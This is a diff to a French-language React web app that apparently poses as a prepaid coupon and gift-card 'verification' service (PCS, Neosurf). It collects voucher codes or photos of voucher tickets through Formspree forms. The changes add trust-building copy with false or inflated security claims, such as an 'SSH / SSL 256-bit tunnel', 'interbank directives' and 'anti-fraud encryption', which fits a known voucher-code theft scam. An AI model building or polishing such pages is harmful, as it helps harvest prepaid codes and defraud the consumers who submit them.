+                              <div key={idx} className="relative rounded-2xl border border-slate-800 overflow-hidden bg-slate-950 p-2 group shadow-lg">
+                                <img
+                                  src={preview}
+                                  alt={`Ticket Preview ${idx + 1}`}
+                                  className="w-full h-36 object-contain rounded-xl"
+                                />
+                                <div className="absolute bottom-4 left-4 bg-slate-900/80 text-[10px] px-2.5 py-1 rounded-md text-slate-300 border border-slate-800 font-mono">
+                                  Image {idx + 1}
+                                </div>
+                                <button
+                                  type="button"
+                                  onClick={() => removeSelectedImage(idx)}
+                                  className="absolute top-4 right-4 w-8 h-8 rounded-full bg-slate-900/95 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white transition cursor-pointer"
+                                >
+                                  <X className="w-4 h-4" />
+                                </button>
+                              </div>
+                            ))}
+                          </div>
+                        )}
 
-                {/* AUTRES COUPONS Saisie Optionnelle/Conditionnelle */}
-                {selectedTypes.includes("Autres coupons") && (
-                  <div className="col-span-1 md:col-span-2 flex flex-col space-y-2 animate-fadeIn">
-                    <label htmlFor="autre_type_saisi" className="text-xs font-bold text-slate-400 uppercase tracking-wide">
-                      Spécifiez le nom du coupon non répertorié : <span className="text-red-500">*</span>
-                    </label>
-                    <input
-                      type="text"
-                      id="autre_type_saisi"
-                      name="nom_coupon_autre"
-                      value={customCouponType}
-                      onChange={(e) => {
-                        setCustomCouponType(e.target.value);
-                        if (errorText) setErrorText(null);
-                      }}
-                      placeholder="Ex: PCS Premium, Ticket Neosurf Pro, etc."
-                      required={selectedTypes.includes("Autres coupons")}
-                      className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
-                    />
+                        {imagePreviews.length < 2 && (
+                          <div
+                            onDragEnter={handleDrag}
+                            onDragOver={handleDrag}
+                            onDragLeave={handleDrag}
+                            onDrop={handleDrop}
+                            onClick={() => fileInputRef.current?.click()}
+                            className={`border-2 border-dashed rounded-2xl p-6 text-center cursor-pointer transition-all duration-200 ${
+                              dragActive
+                                ? "border-blue-500 bg-blue-500/5"
+                                : "border-slate-800 bg-slate-950/30 hover:border-slate-700 hover:bg-slate-950/50"
+                            }`}
+                          >
+                            <input
+                              type="file"
+                              ref={fileInputRef}
+                              onChange={handleFileChange}
+                              accept="image/*"
+                              multiple
+                              className="hidden"
+                            />
+                            <UploadCloud className="w-8 h-8 text-slate-500 mx-auto mb-2 group-hover:scale-105 transition" />
+                            <div className="text-xs font-bold text-slate-300">
+                              {imagePreviews.length === 1 
+                                ? "Glissez-déposez la deuxième image (Optionnel)" 
+                                : "Glissez-déposez une à deux images du ticket (Optionnel)"}
+                            </div>
+                            <div className="text-[10px] text-slate-500 mt-1 uppercase tracking-wider font-semibold">
+                              PNG, JPG ou JPEG (Max 15 Mo par image)
+                            </div>
+                          </div>
+                        )}
+                      </div>
+                    </div>
                   </div>
-                )}
-
-                {/* MONTANT OBLIGATOIRE */}
-                <div className="flex flex-col space-y-2">
-                  <label htmlFor="montant" className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
-                    <Coins className="w-3.5 h-3.5 text-indigo-400" />
-                    Montant ou produit concerné : <span className="text-red-500">*</span>
-                  </label>
-                  <input
-                    type="text"
-                    id="montant"
-                    name="montant"
-                    value={montant}
-                    onChange={(e) => {
-                      setMontant(e.target.value);
-                      if (errorText) setErrorText(null);
-                    }}
-                    placeholder="Saisissez le montant ou produit"
-                    required
-                    className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
-                  />
                 </div>
 
-                {/* CODE DU COUPON */}
-                <div className="flex flex-col space-y-2">
-                  <label htmlFor="code" className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
-                    <Lock className="w-3.5 h-3.5 text-indigo-400" />
-                    Code du coupon ou carte cadeau : <span className="text-red-500">*</span>
-                  </label>
-                  <input
-                    type="text"
-                    id="code"
-                    name="code"
-                    value={couponCode}
-                    onChange={(e) => {
-                      setCouponCode(e.target.value);
-                      if (errorText) setErrorText(null);
-                    }}
-                    placeholder="Ex: SUMMER50 ou GC-ABC12345"
-                    required
-                    style={{ textTransform: "uppercase" }}
-                    className="w-full h-12 bg-slate-900 text-white font-mono text-base font-bold tracking-widest px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none uppercase placeholder:text-slate-600 placeholder:font-sans placeholder:tracking-normal placeholder:text-sm"
-                  />
-                </div>
-
-                {/* CACHER MON CODE COCHES OUI OU NON */}
-                <div className="col-span-1 md:col-span-2 flex flex-col space-y-3">
-                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
-                    <Lock className="w-3.5 h-3.5 text-indigo-400" />
-                    Cacher mon code : <span className="text-red-500">*</span>
-                  </label>
-                  <div className="flex flex-col sm:flex-row sm:items-center gap-6 bg-slate-900/40 p-4 rounded-xl border border-slate-900/60">
-                    <label className="flex items-center gap-2.5 cursor-pointer text-sm font-semibold text-slate-300 hover:text-white select-none">
-                      <input
-                        type="checkbox"
-                        name="cacher_code_oui"
-                        value="OUI"
-                        checked={hideCode === "OUI"}
-                        onChange={() => {
-                          setHideCode("OUI");
-                          if (errorText) setErrorText(null);
-                        }}
-                        className="w-4 h-4 rounded border-slate-850 bg-slate-950 text-indigo-600 focus:ring-1 focus:ring-indigo-500 cursor-pointer accent-indigo-500"
-                      />
-                      <span>OUI (Masquer le code sur le site)</span>
-                    </label>
-                    <label className="flex items-center gap-2.5 cursor-pointer text-sm font-semibold text-slate-300 hover:text-white select-none">
-                      <input
-                        type="checkbox"
-                        name="cacher_code_non"
-                        value="NON"
-                        checked={hideCode === "NON"}
-                        onChange={() => {
-                          setHideCode("NON");
-                          if (errorText) setErrorText(null);
-                        }}
-                        className="w-4 h-4 rounded border-slate-850 bg-slate-950 text-indigo-600 focus:ring-1 focus:ring-indigo-500 cursor-pointer accent-indigo-500"
-                      />
-                      <span>NON (Laisser le code visible)</span>
-                    </label>
-                  </div>
-                  {/* Hidden aggregate value for Formspree form processing */}
-                  <input type="hidden" name="cacher_mon_code" value={hideCode} />
-                </div>
               </div>
 
-              {/* TRUST PHRASE - SANS PARLER DE L'EMAIL DU SUPPORT */}
-              <div className="p-4 bg-indigo-950/15 border border-indigo-900/30 rounded-2xl flex items-start gap-3 mt-4">
-                <RefreshCw className="w-5 h-5 text-indigo-400 shrink-0 mt-0.5 animate-spin" />
+              {/* SECURITY/TRUST INFO */}
+              <div className="p-5 bg-gradient-to-r from-blue-950/20 to-cyan-950/10 border border-blue-900/25 rounded-2xl flex items-start gap-3.5">
+                <ShieldCheck className="w-5 h-5 text-blue-400 shrink-0 mt-0.5 animate-pulse" />
                 <div className="space-y-1">
-                  <h4 className="text-xs font-bold text-indigo-300 uppercase tracking-wider">Traitement sous Protocoles de Sécurité</h4>
-                  <p className="text-slate-350 text-xs leading-relaxed">
-                    L'homologation de votre coupon s'effectue de manière sécurisée et nécessite un traitement méticuleux. Afin de préserver l'intégrité de la procédure, veuillez patienter quelques instants pour la vérification. Les conclusions détaillées et la confirmation de validité vous seront envoyées directement par e-mail à l'adresse renseignée ci-dessus. Merci de votre confiance.
+                  <h4 className="text-xs font-extrabold text-blue-300 uppercase tracking-widest">Technologie Anti-Fraude & Chiffrement de Données</h4>
+                  <p className="text-slate-400 text-xs leading-relaxed max-w-3xl">
+                    Conformément aux directives de sécurité monétique interbancaire, les requêtes d'homologation transitent sous tunnel sécurisé SSH / SSL de 256 bits. Les codes transmis font l'objet d'un chiffrement jeton de sécurité à usage unique pour empêcher toute tentative d'usurpation d'identité ou perte involontaire de solde.
                   </p>
                 </div>
               </div>
@@ -757,22 +931,32 @@ export default function App() {
                 <button
                   type="submit"
                   disabled={isSubmittingFormspree}
-                  className="w-full py-4 bg-gradient-to-r from-indigo-500 via-pink-500 to-rose-500 text-white text-base font-extrabold rounded-2xl hover:shadow-xl hover:shadow-pink-500/20 active:scale-[0.99] transition cursor-pointer disabled:opacity-55"
+                  className="w-full py-4.5 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white text-base font-black rounded-2xl hover:shadow-[0_0_30px_rgba(59,130,246,0.3)] hover:scale-[1.005] active:scale-[0.995] transition-all duration-150 cursor-pointer disabled:opacity-55 flex items-center justify-center gap-2.5"
                 >
-                  {isSubmittingFormspree ? "Envoi et analyse en cours..." : "Envoyer pour vérification"}
+                  {isSubmittingFormspree ? (
+                    <>
+                      <RefreshCw className="w-5 h-5 animate-spin text-white" />
+                      <span>INITIALISATION DE L'HONORABILITÉ SSL...</span>
+                    </>
+                  ) : (
+                    <>
+                      <ShieldCheck className="w-5 h-5 text-white" />
+                      <span>LANCER LA VÉRIFICATION SÉCURISÉE</span>
+                    </>
+                  )}
                 </button>
               </div>
             </form>
           )}
 
-          {/* End of layout block advice */}
-          <div className="mt-8 pt-6 border-t border-slate-900 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-500">
-            <div className="flex items-center gap-1.5">
-              <Lock className="w-4 h-4 text-indigo-500/60" />
-              Saisie protégée par protocole sécurisé 256 bits
+          {/* Sizing description footer inside form container */}
+          <div className="mt-8 pt-6 border-t border-slate-800/60 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-500">
+            <div className="flex items-center gap-1.5 font-semibold text-slate-400">
+              <Lock className="w-4 h-4 text-blue-500/80" />
+              Saisie hautement protégée par certificat de sûreté
             </div>
-            <div>
-              La transmission de votre demande de cryptage et d'indexation est sécurisée, automatique et instantanée.
+            <div className="text-center sm:text-right max-w-md">
+              La transmission de votre demande de cryptage et d'indexation est sécurisée, certifiée, automatique et instantanée.
             </div>
           </div>
 
@@ -929,11 +1113,11 @@ export default function App() {
 
             <div className="p-8 bg-slate-900/50 rounded-2xl border border-slate-850 space-y-4">
               <div className="w-12 h-12 bg-pink-950/80 rounded-xl flex items-center justify-center text-pink-400">
-                <UploadCloud className="w-6 h-6" />
+                <ShieldCheck className="w-6 h-6" />
               </div>
-              <h3 className="text-xl font-bold text-white">Traitement Optique OCR</h3>
+              <h3 className="text-xl font-bold text-white">Cryptage SSL Fort</h3>
               <p className="text-slate-400 text-sm leading-relaxed">
-                Pas besoin de saisir manuellement les longs caractères. Glissez simplement la photo de votre ticket de caisse et notre lecteur analyse les détails instantanément.
+                Toutes les transmissions sont anonymisées sous un protocole de cryptage SSL 256 bits, garantissant l'entière protection de vos informations.
               </p>
             </div>
           </section>
@@ -990,7 +1174,7 @@ export default function App() {
                 </div>
               )}
 
-              <form onSubmit={handleContactSubmit} className="space-y-5" action="https://formspree.io/f/xeedrnej" method="POST">
+              <form onSubmit={handleContactSubmit} className="space-y-5" action="https://formspree.io/f/mzdwjnkv" method="POST">
                 {/* NOM */}
                 <div className="space-y-1.5 flex flex-col">
                   <label htmlFor="nom" className="text-xs font-bold text-slate-400 uppercase tracking-wide">
@@ -1003,7 +1187,7 @@ export default function App() {
                     required
                     value={contactName}
                     onChange={(e) => setContactName(e.target.value)}
-                    placeholder="Jean Dupont"
+                    placeholder=""
                     className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm transition font-medium"
                   />
                 </div>
@@ -1020,24 +1204,7 @@ export default function App() {
                     required
                     value={contactEmail}
                     onChange={(e) => setContactEmail(e.target.value)}
-                    placeholder="votre@email.com"
-                    className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm transition font-medium"
-                  />
-                </div>
-
-                {/* SUJET */}
-                <div className="space-y-1.5 flex flex-col">
-                  <label htmlFor="sujet" className="text-xs font-bold text-slate-400 uppercase tracking-wide">
-                    Sujet de votre demande : <span className="text-red-500">*</span>
-                  </label>
-                  <input
-                    type="text"
-                    id="sujet"
-                    name="sujet"
-                    required
-                    value={contactSubject}
-                    onChange={(e) => setContactSubject(e.target.value)}
-                    placeholder="Ex: Problème avec un coupon, Question sur une commande, Autre..."
+                    placeholder=""
                     className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm transition font-medium"
                   />
                 </div>
@@ -1054,7 +1221,7 @@ export default function App() {
                     rows={8}
                     value={contactMessage}
                     onChange={(e) => setContactMessage(e.target.value)}
-                    placeholder="Décrivez votre problème ou votre question ici..."
+                    placeholder=""
                     className="bg-slate-900 text-white p-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm transition font-medium resize-none"
                   />
                 </div>
@@ -1073,7 +1240,7 @@ export default function App() {
                   ) : (
                     <>
                       <Send className="w-4 h-4" />
-                      Envoyer au Support
+                      Envoyer le message au support
                     </>
                   )}
                 </button>
